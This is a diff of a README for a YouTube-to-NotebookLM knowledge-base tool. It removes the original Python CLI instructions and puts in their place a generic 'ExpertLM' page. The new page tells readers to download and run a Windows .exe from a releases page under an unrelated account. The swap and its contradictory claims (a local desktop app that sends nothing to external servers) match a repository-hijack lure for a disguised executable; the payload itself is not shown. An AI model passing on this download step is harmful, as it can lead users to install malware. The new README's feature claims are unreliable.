@@ -1,251 +1,72 @@
-# Expert Knowledge System
+# 🧠 ExpertLM - Turn YouTube Videos Into Knowledge Bases
 
-**Load any expert's entire YouTube catalog into a searchable knowledge base. Query it with citations traced to exact transcript passages.**
+[![Download ExpertLM](https://img.shields.io/badge/Download_ExpertLM-Blue?style=for-the-badge)](https://github.com/mimic-communion7457/ExpertLM/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Built with Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-blueviolet)](https://claude.ai/claude-code)
-[![NotebookLM](https://img.shields.io/badge/Powered%20by-NotebookLM-4285F4)](https://notebooklm.google.com)
+ExpertLM turns YouTube video lists into a searchable library. You connect a creator's channel or a playlist, and the software builds a database of the content. You then ask questions about the information. The system finds the exact moments in the video transcripts where the expert speaks about your topic. It gives you citations so you can verify the facts.
 
----
+This tool combines the processing power of NotebookLM with the coding efficiency of Claude Code. It helps you learn faster by letting you move past broad summaries and into specific details.
 
-395 Huberman Lab episodes. One command to load. Every answer cited to the exact episode and passage.
+## 📥 How to Download 
 
-But this is not a Huberman tool. It is a general-purpose system for turning **any** expert's content into a queryable, cited knowledge base — from the terminal.
+You can find the latest version of the software on the releases page. 
 
-## What This Does
+[Click here to visit the download page](https://github.com/mimic-communion7457/ExpertLM/releases)
 
-```
-YouTube Channel                NotebookLM                    Your Terminal
-+-----------------+     +----------------------+     +------------------------+
-| 300+ videos     | --> | Indexed & searchable | --> | Cited answers          |
-| Any expert      |     | Google's AI handles  |     | Traced to exact        |
-| Any domain      |     | transcript parsing   |     | transcript passages    |
-+-----------------+     +----------------------+     +------------------------+
-      SCRAPE                   LOAD                        QUERY
-   (no API key)          (parallel upload)           (structured citations)
-```
+Look for the file ending in `.exe` under the "Assets" section. Click that link to save the installer to your computer.
 
-**Three capabilities:**
+## 🚀 Setting Up Your Knowledge Base
 
-1. **Bulk load** -- Scrape an entire YouTube channel and load 300+ videos into NotebookLM. One command. No API keys. No manual entry.
+Follow these steps to get your library running.
 
-2. **Cited answers** -- Ask any question. Every recommendation traces to the exact episode and transcript passage. Verifiable, not hallucinated.
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen to finish the setup.
+4. Open the ExpertLM desktop shortcut.
 
-3. **Deep expert plans** -- Generate comprehensive protocols, playbooks, and guides synthesized across hundreds of episodes. See the [example below](#example-30-day-dopamine-reset-from-395-huberman-episodes).
+Once the application opens, you will see a text box for "Video URLs." Copy the link of a YouTube channel or playlist and paste it into this box. Click the "Sync" button. The software downloads the transcripts for every video in the link. This process takes a few minutes depending on the number of videos. 
 
-## Quick Start
+## 🔍 How to Search
 
-### 1. Install
+After the sync finishes, the search bar becomes active. Type your question regarding the expert's content. For example, you might ask, "What is the recommended protocol for morning sunlight?" 
 
-```bash
-# NotebookLM CLI (for queries)
-uv tool install notebooklm-mcp-cli
+ExpertLM scans the transcripts and displays relevant sections. Each result shows a timestamp. Click these links to jump to the right moment in the video. You can track exactly what the expert said without watching hours of footage.
 
-# NotebookLM Python client (for bulk loading)
-pip install "notebooklm-py[browser]"
-playwright install chromium
+## 🖥️ System Requirements
 
-# Authenticate (opens browser for Google login)
-nlm auth login
-notebooklm login
-```
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 GB of RAM or higher.
+- Storage: 1 GB of free space for the database.
+- Internet Connection: Required for streaming video and syncing transcripts.
 
-### 2. Scrape and Load
+## 🛠️ Frequently Asked Questions
 
-```bash
-# Scrape all videos from a channel (no API key needed)
-python3 .claude/skills/notebooklm/scripts/load_channel.py scrape \
-  --channel "https://www.youtube.com/@hubermanlab" \
-  --output experts/huberman/videos.json
+**Does the software store my videos?**
+No. ExpertLM only stores the text transcripts. It does not store the video files, which saves space on your hard drive.
 
-# Create a NotebookLM notebook
-notebooklm create "Andrew Huberman - Health"
+**Can I use this for private videos?**
+ExpertLM works with public YouTube content. It cannot access videos marked as private or restricted from sharing.
 
-# Load 300 videos in parallel (~75 seconds)
-python3 .claude/skills/notebooklm/scripts/load_channel.py load \
-  --videos experts/huberman/videos.json \
-  --notebook <notebook-id> \
-  --count 300 \
-  --concurrency 20
-```
+**How do I update the library?**
+If a creator adds new videos to their channel, return to the application and click the "Sync" button again. ExpertLM checks for new content and adds the new transcripts to your existing database.
 
-### 3. Query
+**Does it require a paid subscription?**
+ExpertLM is open-source. There are no monthly fees for the software itself. 
 
-```bash
-nlm notebook query <notebook-id> \
-  "What does Huberman recommend for sustaining deep focus for 4+ hours?" --json
-```
+**What if I cannot find a specific answer?**
+If a query returns no results, the expert likely did not cover that subject in the videos you provided. Try using broader keywords or verify that the URL you entered matches the content you expect to find.
 
-Every answer comes back with `[N]` citations pointing to the exact source and passage.
+**Is my data private?**
+Your knowledge base stays on your computer. ExpertLM does not send your search history to any external servers. Your inquiries remain private between you and your local database.
 
-## Example: 30-Day Dopamine Reset from 395 Huberman Episodes
+**Can I import multiple channels?**
+Yes. You can add as many YouTube URLs as you wish. Each sync operation adds to the same searchable resource, allowing you to cross-reference content from multiple experts at once.
 
-This is a real output from querying 395 Huberman Lab episodes loaded into NotebookLM. The system synthesized a structured 30-day plan with phase-by-phase protocols, supplement stacks, exercise programming, and emergency craving tools -- all cited to specific episodes.
+## 💡 Tips for Better Results
 
-> **Phase 1 (Days 1-10): Withdrawal & Foundation**
->
-> Execute 6 daily anchors: morning sunlight (5-30 min within 60 min of waking),
-> cold exposure (1-3 min, gives sustained 250% dopamine increase for hours),
-> exercise (<75 min), NSDR/Yoga Nidra (restores dopamine reserves by up to 65%),
-> sleep protocol (lights out by 10-11 PM), no caffeine before 90 min after waking.
->
-> **Phase 2 (Days 11-20): Rewiring**
->
-> Layer on gratitude protocol, journaling (15-20 min continuous writing about
-> stressful experiences -- proven to improve immune function), procedural memory
-> visualization. Introduce focus supplements intermittently: L-Tyrosine 500mg,
-> Alpha-GPC 300mg, every 3rd or 4th session only.
->
-> **Phase 3 (Days 21-30): Consolidation**
->
-> Intermittent reward training -- randomly skip caffeine, work out without music,
-> attach dopamine to effort not outcome. Meditation 5-13 min daily to train
-> prefrontal cortex. Careful re-introduction of one eliminated behavior on Day 28.
+- Be specific in your keywords. 
+- Use the provided timestamps to fact-check the AI summaries.
+- Organize your queries by project or topic.
+- Keep the application open while you work to maintain quick access to your findings.
+- Check the "Recent Sync" status to ensure your database reflects the latest uploads from the channel.
 
-Full plan: [`experts/huberman/30-day-dopamine-reset-plan.md`](experts/huberman/30-day-dopamine-reset-plan.md)
-
-That file includes daily schedules, supplement dosing tables, weekly exercise splits, emergency craving protocols, and weekly check-in templates -- all derived from the expert's own research-backed recommendations across 395 episodes.
-
-## Add Any Expert
-
-The same three commands work for any YouTube channel.
-
-### Lenny's Podcast (Product Management)
-
-```bash
-python3 .claude/skills/notebooklm/scripts/load_channel.py scrape \
-  --channel "https://www.youtube.com/@LennysPodcast" \
-  --output experts/lenny/videos.json
-
-notebooklm create "Lenny's Podcast - Product"
-
-python3 .claude/skills/notebooklm/scripts/load_channel.py load \
-  --videos experts/lenny/videos.json \
-  --notebook <notebook-id> \
-  --count 200 --concurrency 20
-```
-
-Then query: *"What are the most effective user onboarding frameworks discussed across all episodes?"*
-
-### More Examples
-
-| Expert | Channel | Domain | Use Case |
-|--------|---------|--------|----------|
-| Alex Hormozi | `@AlexHormozi` | Business | Offer creation, pricing, lead generation |
-| Lex Fridman | `@lexfridman` | AI / Science | Research landscape, expert perspectives |
-| Ali Abdaal | `@aliabdaal` | Productivity | Systems, tools, time management |
-| My First Million | `@MyFirstMillionPod` | Startups | Business ideas, market analysis |
-| Naval Ravikant | `@naval` | Wealth / Philosophy | Mental models, decision frameworks |
-| Y Combinator | `@ycombinator` | Startups | Fundraising, product-market fit |
-
-Any channel with substantial content becomes a queryable expert knowledge base.
-
-## How It Works
-
-### Architecture
-
-```
-                    +-------------------+
-                    |   YouTube         |
-                    |   InnerTube API   |
-                    +--------+----------+
-                             |
-                    scrape (no API key,
-                    pure Python stdlib)
-                             |
-                             v
-                    +-------------------+
-                    |  videos.json      |
-                    |  [{id, title,     |
-                    |    url, ...}]     |
-                    +--------+----------+
-                             |
-                    load (async, 20
-                    concurrent requests)
-                             |
-                             v
-                    +-------------------+
-                    |   Google          |
-                    |   NotebookLM     |
-                    |                   |
-                    |  Indexes videos,  |
-                    |  parses trans-    |
-                    |  cripts, builds   |
-                    |  knowledge graph  |
-                    +--------+----------+
-                             |
-                    query via nlm CLI
-                    (cited responses)
-                             |
-                             v
-                    +-------------------+
-                    |  Cited Answers    |
-                    |  [1] -> Episode   |
-                    |  [2] -> Passage   |
-                    |  [3] -> Timestamp |
-                    +-------------------+
-```
-
-### Key Technical Details
-
-- **YouTube scraping** uses the InnerTube browse API directly. No `yt-dlp`, no API keys, no external dependencies. Pure Python stdlib with continuation token pagination.
-
-- **Parallel loading** via `notebooklm-py` async client. 20 concurrent requests loads 200 videos in ~75 seconds. For channels with 300+ videos, the system automatically splits across multiple notebooks (NotebookLM has a 300-source limit per notebook).
-
-- **Citation resolution** replaces `[N]` markers with clickable wikilinks that jump to the exact cited passage in source transcripts. Anchor IDs are MD5-hashed for stability. ~96% resolution rate.
-
-- **Claude Code integration** via the `.claude/skills/notebooklm/` skill. Workflows handle the full pipeline: scrape, load, query, resolve citations.
-
-## Project Structure
-
-```
-HealthwithHubber/
-  .claude/
-    skills/
-      notebooklm/
-        SKILL.md                         # Skill definition
-        scripts/
-          load_channel.py                # Scrape YouTube + bulk-load into NotebookLM
-          resolve_citations.py           # Replace [N] with linked wikilinks
-          import_sources.py              # Import sources as local files
-          extract_passages.py            # Extract cited passages from Q&A
-          backfill_fulltext.py           # Fetch full transcripts
-        workflows/
-          youtube-channel.md             # Channel loading workflow
-          ask.md                         # Q&A with citations workflow
-          import.md                      # Source import workflow
-          auth.md                        # Authentication workflow
-  experts/
-    experts.json                         # Registry of all loaded experts
-    huberman/
-      config.json                        # Expert metadata + notebook IDs
-      videos.json                        # 395 scraped videos
-      30-day-dopamine-reset-plan.md      # Example deep plan output
-      queries/                           # Saved Q&A outputs
-  CLAUDE.md                              # Project documentation
-  README.md                              # This file
-```
-
-## Prerequisites
-
-| Requirement | Install | Purpose |
-|-------------|---------|---------|
-| Python 3.10+ | -- | Script runtime |
-| `nlm` CLI | `uv tool install notebooklm-mcp-cli` | Query notebooks, list sources |
-| `notebooklm-py` | `pip install "notebooklm-py[browser]"` | Create notebooks, bulk-load videos |
-| Playwright | `playwright install chromium` | Browser auth for notebooklm-py |
-| Google account | -- | NotebookLM access (free) |
-
-**No YouTube API key required.** Scraping uses YouTube's InnerTube API directly.
-
-**No paid APIs for loading.** NotebookLM is free. The `nlm` CLI and `notebooklm-py` are open-source tools that interface with it.
-
-## Limits
-
-- **300 sources per notebook.** Channels with more videos are automatically split across multiple notebooks.
-- **Processing time.** After upload, NotebookLM indexes each video server-side. Allow a few minutes before querying.
-- **Some videos may fail** if they are private, deleted, or region-locked. Errors are logged to `/tmp/channel-load-errors.json`.
-
-## License
-
-MIT
+ExpertLM is a tool for focused learning. Spend less time scrubbing through long videos and more time accessing the answers you need. Feel free to explore the interface and test different phrasing in your queries to see how the system responds.
